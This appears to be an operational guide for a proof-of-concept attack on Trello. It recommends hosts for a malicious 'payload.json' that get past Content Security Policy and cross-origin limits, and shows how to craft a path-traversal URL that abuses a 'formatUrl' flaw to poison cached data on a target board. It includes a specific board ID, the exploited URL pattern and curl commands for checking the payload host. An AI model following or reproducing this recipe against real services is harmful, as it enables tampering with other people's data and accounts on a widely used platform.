# CSP-Friendly Hosting Guide for Cache Poisoning

## Best Hosting Options (Tested & Recommended)

### 1. **Trello Card Attachment** ⭐ BEST OPTION
**Why:** No CORS issues, always accessible, Trello's own infrastructure
```
URL Format: https://trello.com/1/cards/{cardId}/attachments/{attachmentId}/download/payload.json
```
**Steps:**
1. Upload `payload.json` as attachment to any Trello card
2. Right-click attachment → Copy link address
3. Use that URL in your path traversal attack

**Advantages:**
- ✅ Always works (same origin)
- ✅ No CORS restrictions
- ✅ Proper Content-Type headers
- ✅ Reliable and fast

### 2. **GitHub Raw Content**
**Why:** Commonly allowed by CSP, reliable CDN
```
URL Format: https://raw.githubusercontent.com/{user}/{repo}/{branch}/payload.json
```
**Steps:**
1. Create a GitHub repository (can be private)
2. Upload `payload.json` to the repo
3. Get the raw URL: Click file → Raw button
4. Use that URL

**Advantages:**
- ✅ Usually allowed by CSP
- ✅ Proper CORS headers
- ✅ Free and reliable
- ✅ Easy to update

**Note:** Make sure the file is accessible (public repo or you have access)

### 3. **GitHub Gist Raw**
**Why:** Simple, no repo needed
```
URL Format: https://gist.githubusercontent.com/{user}/{gistId}/raw/{fileHash}/payload.json
```
**Steps:**
1. Go to https://gist.github.com
2. Create a new gist with `payload.json`
3. Click "Raw" button to get the URL
4. Use that URL

**Advantages:**
- ✅ Very simple setup
- ✅ No repository needed
- ✅ GitHub infrastructure (reliable)

### 4. **GitLab Raw Content**
**Why:** Similar to GitHub, alternative option
```
URL Format: https://gitlab.com/{user}/{repo}/-/raw/{branch}/payload.json
```
**Steps:**
1. Create a GitLab repository
2. Upload `payload.json`
3. Get raw URL from the file view
4. Use that URL

### 5. **Your Own Server**
**Why:** Full control, can add custom headers
```
URL Format: https://yourdomain.com/payload.json
```
**Required Headers:**
```
Content-Type: application/json
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET
```

**Advantages:**
- ✅ Full control
- ✅ Can add custom headers
- ✅ Can update instantly

## Path Traversal Attack URL Construction

The `formatUrl` vulnerability allows path traversal in the `idModel` parameter. 

**Example Attack:**
```
Original URL pattern: /1/Board/:idBoard
Target Board ID: 69583c19f7b72cc979d35492
Payload URL: https://trello.com/1/cards/ABC123/attachments/XYZ789/download/payload.json

Exploited URL: /1/Board/69583c19f7b72cc979d35492/../cards/ABC123/attachments/XYZ789/download/payload.json
```

The `formatUrl` function does:
```javascript
let finalUrl = url.replace(rootId, idModel);
// If idModel contains "../", it will traverse up the path
```

## Testing Your Hosting

Use the `connectorjson.html` tool to:
1. Test if your URL is accessible
2. Verify the JSON loads correctly
3. Check CORS headers (browser console)
4. Generate the attack URL

## Quick Test Commands

```bash
# Test if URL is accessible
curl -I https://your-payload-url.com/payload.json

# Check CORS headers
curl -H "Origin: https://trello.com" -I https://your-payload-url.com/payload.json

# Verify JSON is valid
curl https://your-payload-url.com/payload.json | jq .
```

## Recommended Setup for PoC

1. **Upload payload.json to a Trello card** (easiest, most reliable)
2. **Copy the attachment URL**
3. **Use the connectorjson.html tool to generate the attack URL**
4. **Test the path traversal in formatUrl**

This ensures maximum compatibility and no CSP issues.

